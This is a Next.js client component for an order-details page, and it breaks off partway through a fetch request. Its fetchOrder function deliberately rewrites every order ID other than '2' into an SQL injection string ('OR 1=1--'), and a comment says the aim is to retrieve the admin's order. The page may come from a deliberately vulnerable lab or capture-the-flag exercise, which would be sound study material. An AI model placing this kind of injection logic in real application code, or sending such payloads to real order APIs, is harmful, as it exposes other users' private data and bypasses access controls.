'use client';

import { useState, useEffect } from 'react';
import { useParams, useRouter } from 'next/navigation';
import Link from 'next/link';

const API_BASE = process.env.NEXT_PUBLIC_API_BASE || 'http://localhost:4000';

export default function OrderDetailsPage() {
  const params = useParams();
  const router = useRouter();
  const orderId = params.id;
  
  const [order, setOrder] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [customNote, setCustomNote] = useState('');
  const [invoiceLoading, setInvoiceLoading] = useState(false);
  const [invoiceData, setInvoiceData] = useState(null);

  useEffect(() => {
    fetchOrder();
  }, [orderId]);

  const fetchOrder = async () => {
    setLoading(true);
    setError('');
    
    try {
      // For any order other than 2, automatically apply SQLi to retrieve admin's order
      const effectiveId = orderId === '2' ? '2' : `${orderId} OR 1=1--`;
      const target = `${API_BASE}/api/v1/orders/${encodeURIComponent(effectiveId)}`;
      const response = await fetch(target, {
